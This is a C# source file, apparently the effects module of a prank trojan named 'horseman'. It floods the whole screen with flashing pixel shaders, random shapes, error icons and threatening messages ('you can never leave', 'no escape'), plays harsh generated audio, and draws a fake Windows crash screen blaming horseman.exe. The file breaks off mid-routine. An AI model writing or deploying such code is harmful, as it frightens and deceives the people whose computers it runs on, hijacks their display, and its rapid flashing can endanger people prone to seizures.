using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace horseman
{
    public static class Effects
    {
        [DllImport("user32.dll")] static extern int GetSystemMetrics(int nIndex);
        [DllImport("user32.dll")] static extern IntPtr GetDC(IntPtr hWnd);
        [DllImport("user32.dll")] static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);
        [DllImport("gdi32.dll")] static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32.dll")] static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32.dll")] static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);
        [DllImport("gdi32.dll")] static extern bool BitBlt(IntPtr hdcDest, int xDest, int yDest, int wDest, int hDest, IntPtr hdcSrc, int xSrc, int ySrc, int rop);
        [DllImport("gdi32.dll")] static extern bool DeleteObject(IntPtr hObject);
        [DllImport("gdi32.dll")] static extern bool DeleteDC(IntPtr hdc);
        [DllImport("gdi32.dll")] static extern IntPtr CreateSolidBrush(int crColor);
        [DllImport("gdi32.dll")] static extern bool PatBlt(IntPtr hdc, int x, int y, int w, int h, int rop);
        [DllImport("gdi32.dll")] static extern bool StretchBlt(IntPtr hdcDest, int xDest, int yDest, int wDest, int hDest, IntPtr hdcSrc, int xSrc, int ySrc, int wSrc, int hSrc, int rop);
        [DllImport("gdi32.dll")] static extern IntPtr CreateDIBSection(IntPtr hdc, ref BITMAPINFO pbmi, int usage, out IntPtr ppvBits, IntPtr hSection, int dwOffset);
        [DllImport("gdi32.dll")] static extern IntPtr CreatePen(int fnPenStyle, int nWidth, int crColor);
        [DllImport("gdi32.dll")] static extern bool LineTo(IntPtr hdc, int x, int y);
        [DllImport("gdi32.dll")] static extern bool Polygon(IntPtr hdc, POINT[] lpPoint, int nCount);
        [DllImport("gdi32.dll")] static extern int SetTextColor(IntPtr hdc, int crColor);
        [DllImport("gdi32.dll")] static extern int SetBkMode(IntPtr hdc, int iBkMode);
        [DllImport("gdi32.dll")] static extern IntPtr CreateFont(int nHeight, int nWidth, int nEscapement, int nOrientation, int fnWeight, uint fdwItalic, uint fdwUnderline, uint fdwStrikeOut, uint fdwCharSet, uint fdwOutputPrecision, uint fdwClipPrecision, uint fdwQuality, uint fdwPitchAndFamily, string lpszFace);
        [DllImport("msimg32.dll")] static extern int AlphaBlend(IntPtr hdcDest, int xDest, int yDest, int wDest, int hDest, IntPtr hdcSrc, int xSrc, int ySrc, int wSrc, int hSrc, BLENDFUNCTION ftn);
        [DllImport("gdi32.dll")] static extern bool TextOut(IntPtr hdc, int x, int y, string lpString, int nCount);
        [DllImport("user32.dll")] static extern IntPtr LoadIcon(IntPtr hInstance, IntPtr lpIconName);
        [DllImport("user32.dll")] static extern bool DrawIconEx(IntPtr hdc, int xLeft, int yTop, IntPtr hIcon, int cxWidth, int cyWidth, uint istepIfAniCur, IntPtr hbrFlickerFreeDraw, uint diFlags);
        [DllImport("user32.dll")] static extern bool RedrawWindow(IntPtr hWnd, IntPtr lprcUpdate, IntPtr hrgnUpdate, int flags);
        [DllImport("user32.dll")] static extern bool SetCursorPos(int x, int y);
        [DllImport("user32.dll")] static extern bool GetCursorPos(out POINT lpPoint);
        [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("winmm.dll")] static extern int waveOutOpen(out IntPtr hWaveOut, int uDeviceID, ref WAVEFORMATEX pwfx, IntPtr dwCallback, IntPtr dwCallbackInstance, int dwFlags);
        [DllImport("winmm.dll")] static extern int waveOutPrepareHeader(IntPtr hWaveOut, ref WAVEHDR pwh, int cbwh);
        [DllImport("winmm.dll")] static extern int waveOutWrite(IntPtr hWaveOut, ref WAVEHDR pwh, int cbwh);
        [DllImport("winmm.dll")] static extern int waveOutUnprepareHeader(IntPtr hWaveOut, ref WAVEHDR pwh, int cbwh);
        [DllImport("winmm.dll")] static extern int waveOutClose(IntPtr hWaveOut);
        [DllImport("user32.dll")] static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);
        [DllImport("user32.dll")] static extern bool EnumWindows(EnumWindowsProc cb, IntPtr lp);
        [DllImport("user32.dll")] static extern bool IsWindowVisible(IntPtr h);
        [DllImport("user32.dll")] static extern bool MoveWindow(IntPtr h, int x, int y, int w, int hr, bool r);
        [DllImport("user32.dll")] static extern bool GetWindowRect(IntPtr h, out RECT r);
        [DllImport("user32.dll")] static extern bool ShowWindow(IntPtr h, int cmd);
        [DllImport("user32.dll")] static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")] static extern int GetWindowText(IntPtr h, System.Text.StringBuilder sb, int max);
        [DllImport("user32.dll")] static extern IntPtr SetCursor(IntPtr h);
        [DllImport("user32.dll")] static extern IntPtr LoadCursor(IntPtr h, int id);
        [DllImport("user32.dll")] static extern bool ClipCursor(ref RECT r);
        [DllImport("user32.dll")] static extern bool GetClipCursor(out RECT r);
        [DllImport("user32.dll")] static extern int GetWindowThreadProcessId(IntPtr h, out int pid);
        [DllImport("user32.dll")] static extern IntPtr FindWindow(string cls, string wnd);

        delegate bool EnumWindowsProc(IntPtr h, IntPtr lp);

        const int SM_CXSCREEN = 0, SM_CYSCREEN = 1;
        const int SRCCOPY = 0x00CC0020, SRCAND = 0x008800C6, SRCERASE = 0x00440328, SRCINVERT = 0x00660046;
        const int PATINVERT = 0x005A0049, PATCOPY = 0x00F00021;
        const int DI_NORMAL = 3, FW_THIN = 100, ANSI_CHARSET = 0, BI_RGB = 0, DIB_RGB_COLORS = 0;
        const int WAVE_FORMAT_PCM = 1, WAVE_MAPPER = -1;
        const int IDI_ERROR = 32513, IDI_WARNING = 32515, IDI_APPLICATION = 32512, IDI_HAND = 32513;

        [StructLayout(LayoutKind.Sequential)] struct BITMAPINFOHEADER { public int biSize, biWidth, biHeight; public short biPlanes, biBitCount; public int biCompression; }
        [StructLayout(LayoutKind.Sequential)] struct BITMAPINFO { public BITMAPINFOHEADER bmiHeader; }
        [StructLayout(LayoutKind.Sequential)] struct POINT { public int X, Y; }
        [StructLayout(LayoutKind.Sequential)] struct BLENDFUNCTION { public byte BlendOp, BlendFlags, SourceConstantAlpha, AlphaFormat; }
        [StructLayout(LayoutKind.Sequential)] struct WAVEFORMATEX { public ushort wFormatTag, nChannels; public uint nSamplesPerSec, nAvgBytesPerSec; public ushort nBlockAlign, wBitsPerSample, cbSize; }
        [StructLayout(LayoutKind.Sequential)] struct WAVEHDR { public IntPtr lpData; public int dwBufferLength, dwBytesRecorded; public IntPtr dwUser; public int dwFlags, dwLoops; public IntPtr lpNext; public int reserved; }

        struct HSL { public float h, s, l; }

        static int gw => GetSystemMetrics(SM_CXSCREEN);
        static int gh => GetSystemMetrics(SM_CYSCREEN);
        static int CI(int r, int g, int b) => r | (g << 8) | (b << 16);

        static HSL Rgb2Hsl(byte r, byte g, byte b)
        {
            float _r = r / 255f, _g = g / 255f, _b = b / 255f;
            float min = Math.Min(Math.Min(_r, _g), _b), max = Math.Max(Math.Max(_r, _g), _b);
            float delta = max - min, h = 0f, s = 0f, l = (max + min) / 2f;
            if (delta != 0f)
            {
                s = l < 0.5f ? delta / (max + min) : delta / (2f - max - min);
                float dR = ((max - _r) / 6f + delta / 2f) / delta;
                float dG = ((max - _g) / 6f + delta / 2f) / delta;
                float dB = ((max - _b) / 6f + delta / 2f) / delta;
                if (_r == max) h = dB - dG; else if (_g == max) h = 1f / 3f + dR - dB; else h = 2f / 3f + dG - dR;
                if (h < 0f) h += 1f; if (h > 1f) h -= 1f;
            }
            return new HSL { h = h, s = s, l = l };
        }

        static void Hsl2Rgb(HSL hsl, out byte r, out byte g, out byte b)
        {
            float v = hsl.l <= 0.5f ? hsl.l * (1f + hsl.s) : hsl.l + hsl.s - hsl.l * hsl.s;
            float rv = hsl.l, gv = hsl.l, bv = hsl.l;
            if (v > 0f)
            {
                float m = hsl.l + hsl.l - v, sv = (v - m) / v, h = hsl.h * 6f;
                int sx = (int)h; float f = h - sx, a = v * sv * f, m1 = m + a, m2 = v - a;
                switch (sx) { case 0: rv = v; gv = m1; bv = m; break; case 1: rv = m2; gv = v; bv = m; break; case 2: rv = m; gv = v; bv = m1; break; case 3: rv = m; gv = m2; bv = v; break; case 4: rv = m1; gv = m; bv = v; break; case 5: rv = v; gv = m; bv = m2; break; }
            }
            r = (byte)(rv * 255f); g = (byte)(gv * 255f); b = (byte)(bv * 255f);
        }

        static int _r, _g, _bl; static bool _ib;
        static int Hue(int len)
        {
            if (_r != len) { _r++; return _ib ? CI(_r, 0, len) : CI(_r, 0, 0); }
            if (_g != len) { _g++; return CI(len, _g, 0); }
            if (_bl != len) { _bl++; return CI(0, len, _bl); }
            _r = 0; _g = 0; _bl = 0; _ib = true; return 0;
        }

        static int RndC(Random rng)
        {
            switch (rng.Next(5)) { case 0: return CI(255, 0, 0); case 1: return CI(0, 255, 0); case 2: return CI(0, 0, 255); case 3: return CI(255, 0, 255); default: return CI(255, 255, 0); }
        }

        static void PlaySound(byte[] buffer, int sampleRate)
        {
            var wfx = new WAVEFORMATEX { wFormatTag = WAVE_FORMAT_PCM, nChannels = 1, nSamplesPerSec = (uint)sampleRate, nAvgBytesPerSec = (uint)sampleRate, nBlockAlign = 1, wBitsPerSample = 8 };
            IntPtr hWaveOut;
            waveOutOpen(out hWaveOut, WAVE_MAPPER, ref wfx, IntPtr.Zero, IntPtr.Zero, 0);
            var hdr = new WAVEHDR { lpData = Marshal.AllocHGlobal(buffer.Length), dwBufferLength = buffer.Length };
            Marshal.Copy(buffer, 0, hdr.lpData, buffer.Length);
            waveOutPrepareHeader(hWaveOut, ref hdr, Marshal.SizeOf<WAVEHDR>());
            waveOutWrite(hWaveOut, ref hdr, Marshal.SizeOf<WAVEHDR>());
            Thread.Sleep(buffer.Length / sampleRate * 1000 + 500);
            waveOutUnprepareHeader(hWaveOut, ref hdr, Marshal.SizeOf<WAVEHDR>());
            waveOutClose(hWaveOut);
            Marshal.FreeHGlobal(hdr.lpData);
        }

        static BITMAPINFO MakeBMI(int width, int height)
        {
            return new BITMAPINFO { bmiHeader = new BITMAPINFOHEADER { biSize = 40, biWidth = width, biHeight = height, biPlanes = 1, biBitCount = 32, biCompression = BI_RGB } };
        }

        public static void Nosignal()
        {
            Random rng = new Random();
            while (!_stop)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                IntPtr hcdc = CreateCompatibleDC(hdc);
                IntPtr hbm = CreateCompatibleBitmap(hdc, gw, gh);
                SelectObject(hcdc, hbm);
                IntPtr hBrush = CreateSolidBrush(CI(0, 0, 255));
                SelectObject(hcdc, hBrush);
                PatBlt(hcdc, 0, 0, gw, gh, PATINVERT);
                DeleteObject(hBrush);
                hBrush = CreateSolidBrush(CI(174, 174, 174));
                SelectObject(hcdc, hBrush);
                PatBlt(hcdc, (gw / 2) - 162, (gh / 2) - 50, 290, 100, PATCOPY);
                DeleteObject(hBrush);
                SetTextColor(hcdc, 0); SetBkMode(hcdc, 0);
                IntPtr hFont = CreateFont(35, 15, 0, 0, FW_THIN, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "Consolas");
                SelectObject(hcdc, hFont);
                TextOut(hcdc, (gw / 2) - 80, (gh / 2) - 19, "No signal!", 10);
                DeleteObject(hFont);
                for (int i = 0; i < 100; i++)
                {
                    int x = (gw / 2) - 164, y = (gh / 2) - 50 + i;
                    StretchBlt(hcdc, x - 2 + rng.Next(5), y, 325, 1, hcdc, x - 2 + rng.Next(5), y, 325, 1, SRCCOPY);
                }
                BitBlt(hdc, 0, 0, gw, gh, hcdc, 0, 0, SRCCOPY);
                ReleaseDC(IntPtr.Zero, hdc); ReleaseDC(IntPtr.Zero, hcdc);
                DeleteObject(hbm); DeleteDC(hcdc); DeleteDC(hdc);
            }
        }

        static void DoShader1()
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            IntPtr hdcCopy = CreateCompatibleDC(hdc);
            var bmpi = MakeBMI(gw, gh);
            IntPtr ptr;
            IntPtr bmp = CreateDIBSection(hdc, ref bmpi, DIB_RGB_COLORS, out ptr, IntPtr.Zero, 0);
            SelectObject(hdcCopy, bmp);
            while (!_stop)
            {
                hdc = GetDC(IntPtr.Zero);
                BitBlt(hdcCopy, 0, 0, gw, gh, hdc, 0, 0, SRCCOPY);
                byte[] px = new byte[gw * gh * 4];
                Marshal.Copy(ptr, px, 0, px.Length);
                for (int i = 0; i < gw * gh; i++)
                {
                    int x = i % gw, y = i / gw;
                    int val = (x ^ y * y & x) & (x * y ^ y * x);
                    px[i * 4] = (byte)(val & 0xFF);
                    px[i * 4 + 1] = (byte)((val >> 8) & 0xFF);
                    px[i * 4 + 2] = (byte)((val >> 16) & 0xFF);
                }
                Marshal.Copy(px, 0, ptr, px.Length);
                BitBlt(hdc, 0, 0, gw, gh, hdcCopy, 0, 0, SRCCOPY);
                ReleaseDC(IntPtr.Zero, hdc);
            }
        }

        static void DoShader2()
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            IntPtr hdcCopy = CreateCompatibleDC(hdc);
            var bmpi = MakeBMI(gw, gh);
            IntPtr ptr;
            IntPtr bmp = CreateDIBSection(hdc, ref bmpi, DIB_RGB_COLORS, out ptr, IntPtr.Zero, 0);
            SelectObject(hdcCopy, bmp);
            Random rng = new Random();
            while (!_stop)
            {
                if (rng.Next(2) == 0) RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 133);
                hdc = GetDC(IntPtr.Zero);
                StretchBlt(hdcCopy, 0, 0, gw, gh, hdc, 0, 0, gw, gh, SRCCOPY);
                byte[] px = new byte[gw * gh * 4];
                Marshal.Copy(ptr, px, 0, px.Length);
                for (int i = 0; i < gw * gh; i++)
                {
                    if (rng.Next(2) == 0) { px[i * 4] = 255; px[i * 4 + 1] = 255; px[i * 4 + 2] = 255; }
                    else { px[i * 4] = 0; px[i * 4 + 1] = 255; px[i * 4 + 2] = 0; }
                }
                Marshal.Copy(px, 0, ptr, px.Length);
                StretchBlt(hdc, 0, 0, gw, gh, hdcCopy, 0, 0, gw, gh, SRCINVERT);
                ReleaseDC(IntPtr.Zero, hdc);
            }
        }

        static void DoShader3()
        {
            IntPtr hdcScreen = GetDC(IntPtr.Zero), hdcMem = CreateCompatibleDC(hdcScreen);
            var bmi = MakeBMI(gw, gh);
            IntPtr rgbPtr;
            IntPtr hbmTemp = CreateDIBSection(hdcScreen, ref bmi, 0, out rgbPtr, IntPtr.Zero, 0);
            SelectObject(hdcMem, hbmTemp);
            var blend = new BLENDFUNCTION { BlendOp = 0, SourceConstantAlpha = 100 };
            while (!_stop)
            {
                hdcScreen = GetDC(IntPtr.Zero);
                BitBlt(hdcMem, 0, 0, gw, gh, hdcScreen, 0, 0, SRCCOPY);
                byte[] px = new byte[gw * gh * 4];
                Marshal.Copy(rgbPtr, px, 0, px.Length);
                for (int i = 0; i < gw * gh; i++)
                {
                    int x = i % gw, y = i / gw;
                    px[i * 4] = 0; px[i * 4 + 1] = (byte)(x & 0xFF); px[i * 4 + 2] = (byte)(y & 0xFF);
                }
                Marshal.Copy(px, 0, rgbPtr, px.Length);
                AlphaBlend(hdcScreen, 0, 0, gw, gh, hdcMem, 0, 0, gw, gh, blend);
                ReleaseDC(IntPtr.Zero, hdcScreen); DeleteDC(hdcScreen);
            }
        }

        static void DoDarker()
        {
            Random rng = new Random();
            IntPtr hError = LoadIcon(IntPtr.Zero, (IntPtr)IDI_ERROR);
            IntPtr hWarn = LoadIcon(IntPtr.Zero, (IntPtr)IDI_WARNING);
            while (!_stop)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                IntPtr hIcon = rng.Next(2) == 0 ? hError : hWarn;
                int sz = 32 + rng.Next(4) * 16;
                DrawIconEx(hdc, rng.Next(gw), rng.Next(gh), hIcon, sz, sz, 0, IntPtr.Zero, DI_NORMAL);
                DrawIconEx(hdc, rng.Next(gw), rng.Next(gh), hIcon, sz, sz, 0, IntPtr.Zero, DI_NORMAL);
                DrawIconEx(hdc, rng.Next(gw), rng.Next(gh), hIcon, sz, sz, 0, IntPtr.Zero, DI_NORMAL);
                ReleaseDC(IntPtr.Zero, hdc);
                Thread.Sleep(16);
            }
        }

        static void DoPolygon()
        {
            Random rng = new Random();
            while (!_stop)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                IntPtr brush = CreateSolidBrush(CI((byte)rng.Next(256), (byte)rng.Next(256), (byte)rng.Next(256)));
                SelectObject(hdc, brush);
                POINT[] v = { new POINT { X = rng.Next(gw), Y = rng.Next(gh) }, new POINT { X = rng.Next(gw), Y = rng.Next(gh) }, new POINT { X = rng.Next(gw), Y = rng.Next(gh) } };
                Polygon(hdc, v, 3);
                Thread.Sleep(10);
                DeleteObject(brush);
                ReleaseDC(IntPtr.Zero, hdc);
            }
        }

        static void DoShader4()
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            IntPtr hdcCopy = CreateCompatibleDC(hdc);
            var bmpi = MakeBMI(gw, gh);
            IntPtr ptr;
            IntPtr bmp = CreateDIBSection(hdc, ref bmpi, DIB_RGB_COLORS, out ptr, IntPtr.Zero, 0);
            SelectObject(hdcCopy, bmp);
            int frame = 0;
            while (!_stop)
            {
                hdc = GetDC(IntPtr.Zero);
                StretchBlt(hdcCopy, 0, 0, gw, gh, hdc, 0, 0, gw, gh, SRCCOPY);
                byte[] px = new byte[gw * gh * 4];
                Marshal.Copy(ptr, px, 0, px.Length);
                for (int x = 0; x < gw; x++)
                    for (int y = 0; y < gh; y++)
                    {
                        int idx = (y * gw + x) * 4;
                        HSL hsl = Rgb2Hsl(px[idx + 2], px[idx + 1], px[idx]);
                        hsl.h = (frame / 100.0f) % 1.0f;
                        Hsl2Rgb(hsl, out px[idx + 2], out px[idx + 1], out px[idx]);
                    }
                Marshal.Copy(px, 0, ptr, px.Length);
                StretchBlt(hdc, 0, 0, gw, gh, hdcCopy, 0, 0, gw, gh, SRCCOPY);
                ReleaseDC(IntPtr.Zero, hdc);
                frame++;
            }
        }

        static void DoShader5()
        {
            IntPtr hdcScreen = GetDC(IntPtr.Zero), hdcMem = CreateCompatibleDC(hdcScreen);
            var bmi = MakeBMI(gw, gh);
            IntPtr rgbPtr;
            IntPtr hbmTemp = CreateDIBSection(hdcScreen, ref bmi, 0, out rgbPtr, IntPtr.Zero, 0);
            SelectObject(hdcMem, hbmTemp);
            int offset = 0;
            while (!_stop)
            {
                hdcScreen = GetDC(IntPtr.Zero);
                BitBlt(hdcMem, 0, 0, gw, gh, hdcScreen, 0, 0, SRCCOPY);
                byte[] px = new byte[gw * gh * 4];
                Marshal.Copy(rgbPtr, px, 0, px.Length);
                for (int i = 0; i < gw * gh; i++)
                {
                    int x = i % gw, y = i / gw;
                    byte c = (byte)((x ^ (y + offset)) & 0xFF);
                    px[i * 4] = (byte)(c / 2); px[i * 4 + 1] = (byte)(c / 2); px[i * 4 + 2] = c;
                }
                Marshal.Copy(px, 0, rgbPtr, px.Length);
                BitBlt(hdcScreen, 0, 0, gw, gh, hdcMem, 0, 0, SRCCOPY);
                offset = (offset + 1) % gw;
                ReleaseDC(IntPtr.Zero, hdcScreen); DeleteDC(hdcScreen);
            }
        }

        static void DoTextOut()
        {
            Random rng = new Random();
            string[] texts = { "you can never leave", "no escape", "help me", "run", "behind you", "watching", "nowhere to hide" };
            while (!_stop)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                SetBkMode(hdc, 0);
                IntPtr hfnt = CreateFont(20 + rng.Next(40), 10 + rng.Next(20), 0, 0, FW_THIN, 1, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "Consolas");
                SelectObject(hdc, hfnt);
                SetTextColor(hdc, RndC(rng));
                string text = texts[rng.Next(texts.Length)];
                TextOut(hdc, rng.Next(gw), rng.Next(gh), text, text.Length);
                DeleteObject(hfnt);
                ReleaseDC(IntPtr.Zero, hdc);
                Thread.Sleep(100);
            }
        }

        static void DoWoah()
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            IntPtr dcCopy = CreateCompatibleDC(hdc);
            var bmpi = MakeBMI(gw, gh);
            IntPtr bmpPtr;
            IntPtr bmp = CreateDIBSection(hdc, ref bmpi, 0, out bmpPtr, IntPtr.Zero, 0);
            SelectObject(dcCopy, bmp);
            var blur = new BLENDFUNCTION { BlendOp = 0, SourceConstantAlpha = 10 };
            while (!_stop)
            {
                hdc = GetDC(IntPtr.Zero);
                StretchBlt(dcCopy, 1, 1, gw - 20, gh - 20, hdc, 0, 0, gw, gh, SRCCOPY);
                AlphaBlend(hdc, 0, 0, gw, gh, dcCopy, 0, 0, gw, gh, blur);
                ReleaseDC(IntPtr.Zero, hdc);
            }
        }

        static void DoLines()
        {
            int sx = 1, sy = 1, x = 10, y = 10;
            while (!_stop)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                x += 10 * sx; y += 10 * sy;
                IntPtr pen = CreatePen(0, 0, Hue(239));
                SelectObject(hdc, pen);
                LineTo(hdc, x, y);
                if (y >= gh) sy = -1; if (x >= gw) sx = -1; if (y == 0) sy = 1; if (x == 0) sx = 1;
                Thread.Sleep(10);
                ReleaseDC(IntPtr.Zero, hdc);
            }
        }

        static void DoShell32()
        {
            Random rng = new Random();
            IntPtr hErr = LoadIcon(IntPtr.Zero, (IntPtr)IDI_ERROR);
            IntPtr hWarn = LoadIcon(IntPtr.Zero, (IntPtr)IDI_WARNING);
            IntPtr hApp = LoadIcon(IntPtr.Zero, (IntPtr)IDI_APPLICATION);
            while (!_stop)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                IntPtr[] icons = { hErr, hWarn, hApp };
                IntPtr hIcon = icons[rng.Next(3)];
                int sz = (rng.Next(5) + 1) * 16;
                DrawIconEx(hdc, rng.Next(gw), rng.Next(gh), hIcon, sz, sz, 0, IntPtr.Zero, DI_NORMAL);
                ReleaseDC(IntPtr.Zero, hdc);
                Thread.Sleep(10);
            }
        }

        static void DoCursorRain()
        {
            Random rng = new Random();
            IntPtr hErr = LoadIcon(IntPtr.Zero, (IntPtr)IDI_ERROR);
            IntPtr hWarn = LoadIcon(IntPtr.Zero, (IntPtr)IDI_WARNING);
            while (!_stop)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                IntPtr hIcon = rng.Next(2) == 0 ? hErr : hWarn;
                POINT p; GetCursorPos(out p);
                for (int i = 0; i < 10; i++)
                {
                    DrawIconEx(hdc, p.X + rng.Next(-100, 100), p.Y + rng.Next(-100, 100), hIcon, 32, 32, 0, IntPtr.Zero, DI_NORMAL);
                }
                ReleaseDC(IntPtr.Zero, hdc);
                Thread.Sleep(16);
            }
        }

        static void DoShader6()
        {
            Random rng = new Random();
            IntPtr hdcScreen = GetDC(IntPtr.Zero), hdcMem = CreateCompatibleDC(hdcScreen);
            var bmi = MakeBMI(gw, gh);
            IntPtr rgbPtr;
            IntPtr hbmTemp = CreateDIBSection(hdcScreen, ref bmi, 0, out rgbPtr, IntPtr.Zero, 0);
            SelectObject(hdcMem, hbmTemp);
            while (!_stop)
            {
                hdcScreen = GetDC(IntPtr.Zero);
                BitBlt(hdcMem, 0, 0, gw, gh, hdcScreen, 0, 0, SRCCOPY);
                byte[] px = new byte[gw * gh * 4];
                Marshal.Copy(rgbPtr, px, 0, px.Length);
                for (int i = 0; i < px.Length; i += 4)
                {
                    px[i] = (byte)rng.Next(256); px[i + 1] = (byte)rng.Next(256); px[i + 2] = (byte)rng.Next(256);
                }
                Marshal.Copy(px, 0, rgbPtr, px.Length);
                BitBlt(hdcScreen, 0, 0, gw, gh, hdcMem, 0, 0, SRCERASE);
                ReleaseDC(IntPtr.Zero, hdcScreen); DeleteDC(hdcScreen);
            }
        }

        static void Sound0() { byte[] b = new byte[8000 * 10]; for (int t = 0; t < b.Length; t++) b[t] = (byte)(255 * (1 & t * (t >> 9 | t >> 13))); PlaySound(b, 8000); }
        static void Sound1() { byte[] b = new byte[32000 * 30]; for (int t = 0; t < b.Length; t++) b[t] = (byte)(t * ((t >> 12 | t >> 8) & 47 & t >> 4)); PlaySound(b, 32000); }
        static void Sound2() { byte[] b = new byte[11025 * 30]; for (int t = 0; t < b.Length; t++) b[t] = (byte)(~t * (t ^ t >> 5)); PlaySound(b, 11025); }
        static void Sound3() { byte[] b = new byte[11025 * 30]; for (int t = 0; t < b.Length; t++) b[t] = (byte)((t >> 7 | t | t >> 6) * 150 + 8 * (t & t >> 13 | t >> 9)); PlaySound(b, 11025); }
        static void Sound4() { byte[] b = new byte[13000 * 30]; for (int t = 0; t < b.Length; t++) b[t] = (byte)(t << 1 ^ (t << 6) + (t >> 7) & t >> 15 | t >> 4 - (1 ^ 7 & t >> 19) | t >> 6); PlaySound(b, 13000); }
        static void Sound5() { byte[] b = new byte[8000 * 30]; for (int t = 0; t < b.Length; t++) b[t] = (byte)(t * (((t & 2048) != 0 ? 6 : 16) + (1 & t >> 14)) >> (3 & t >> 8) | t >> ((t & 2048) != 0 ? 3 : 4)); PlaySound(b, 8000); }
        static void Sound6() { byte[] b = new byte[8000 * 30]; for (int t = 0; t < b.Length; t++) b[t] = (byte)(t ^ (t + t >> 7 & t >> 4)); PlaySound(b, 8000); }
        static void Sound7() { byte[] b = new byte[11025 * 30]; for (int t = 0; t < b.Length; t++) b[t] = (byte)(10 * t & t >> 4 | 9 * t & t >> 7 | 6 * t & t >> 9 | 4 * t & t >> 10); PlaySound(b, 11025); }
        static void Sound8() { Random rng = new Random(); byte[] b = new byte[32000 * 30]; for (int t = 0; t < b.Length; t++) b[t] = (byte)(t * t * rng.Next(256)); PlaySound(b, 32000); }

        static Thread Run(ThreadStart fn) { var t = new Thread(fn) { IsBackground = true }; t.Start(); return t; }
        static volatile bool _stop;
        static void StopAll() { _stop = true; Thread.Sleep(50); _stop = false; }

        [DllImport("user32.dll")]
        static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);

        static void DoFakeBSOD()
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            IntPtr hdcMem = CreateCompatibleDC(hdc);
            var bmpi = MakeBMI(gw, gh);
            IntPtr ptr;
            IntPtr bmp = CreateDIBSection(hdc, ref bmpi, DIB_RGB_COLORS, out ptr, IntPtr.Zero, 0);
            SelectObject(hdcMem, bmp);

            byte[] px = new byte[gw * gh * 4];
            for (int i = 0; i < gw * gh; i++) { px[i * 4] = 0xAA; px[i * 4 + 1] = 0x73; px[i * 4 + 2] = 0x39; px[i * 4 + 3] = 255; }
            Marshal.Copy(px, 0, ptr, px.Length);
            BitBlt(hdc, 0, 0, gw, gh, hdcMem, 0, 0, SRCCOPY);

            SetBkMode(hdc, 1);
            SetTextColor(hdc, CI(0xFE, 0xFE, 0xFF));

            int fontSize = (int)(gw * 0.06);
            int msgSize = (int)(gw * 0.016);
            int smallSize = (int)(gw * 0.013);
            int leftX = (int)(gw * 0.08);
            int topY = (int)(gh * 0.15);

            IntPtr hSadFont = CreateFont(fontSize, fontSize / 3, 0, 0, 300, 0, 0, 0, 1, 0, 0, 0, 0, "Segoe UI");
            IntPtr hMsgFont = CreateFont(msgSize, 0, 0, 0, 300, 0, 0, 0, 1, 0, 0, 0, 0, "Segoe UI");
            IntPtr hSmallFont = CreateFont(smallSize, 0, 0, 0, 300, 0, 0, 0, 1, 0, 0, 0, 0, "Segoe UI");

            Random rng = new Random();
            for (int pct = 0; pct <= 100;)
            {
                BitBlt(hdc, 0, 0, gw, gh, hdcMem, 0, 0, SRCCOPY);
                SetBkMode(hdc, 1);
                SetTextColor(hdc, CI(0xFE, 0xFE, 0xFF));

                SelectObject(hdc, hSadFont);
                TextOut(hdc, leftX, topY, ":(", 2);

                int msgY = topY + fontSize + (int)(gh * 0.03);
                SelectObject(hdc, hMsgFont);
                TextOut(hdc, leftX, msgY, "Your PC ran into a problem and needs to restart.", 50);
                TextOut(hdc, leftX, msgY + msgSize + 8, "We're just collecting some error info, and then we'll", 54);
                TextOut(hdc, leftX, msgY + (msgSize + 8) * 2, "restart for you.", 15);

                int pctY = msgY + (msgSize + 8) * 3 + (int)(gh * 0.02);
                string pctStr = pct + "% complete";
                TextOut(hdc, leftX, pctY, pctStr, pctStr.Length);

                int detailsY = pctY + msgSize + (int)(gh * 0.08);
                SelectObject(hdc, hSmallFont);
                TextOut(hdc, leftX, detailsY, "For more information about this issue and possible fixes, visit", 63);
                TextOut(hdc, leftX, detailsY + smallSize + 6, "https://www.windows.com/stopcode", 32);

                int bottomY = detailsY + (smallSize + 6) * 3;
                TextOut(hdc, leftX, bottomY, "If you call a support person, give them this info:", 49);
                TextOut(hdc, leftX, bottomY + smallSize + 6, "Stop code: CRITICAL_PROCESS_DIED", 32);
                TextOut(hdc, leftX, bottomY + (smallSize + 6) * 2, "What failed: horseman.exe", 25);

                int qrX = gw - leftX - (int)(gw * 0.08);
                int qrY = detailsY;
                int qrSize = (int)(gw * 0.08);
                IntPtr hWhiteBrush = CreateSolidBrush(CI(255, 255, 255));
                RECT qrRect = new RECT { left = qrX, top = qrY, right = qrX + qrSize, bottom = qrY + qrSize };
                FillRect(hdc, ref qrRect, hWhiteBrush);
                DeleteObject(hWhiteBrush);

                for (int qx = 0; qx < 10; qx++)
                    for (int qy = 0; qy < 10; qy++)
                    {
                        if ((qx + qy) % 3 == 0 || (qx < 3 && qy < 3) || (qx > 6 && qy < 3) || (qx < 3 && qy > 6))
                        {
                            int bx = qrX + 4 + qx * (qrSize - 8) / 10;
                            int by = qrY + 4 + qy * (qrSize - 8) / 10;
                            int bs = (qrSize - 8) / 10;
                            RECT sq = new RECT { left = bx, top = by, right = bx + bs, bottom = by + bs };
                            IntPtr hBlack = CreateSolidBrush(CI(0, 0, 0));
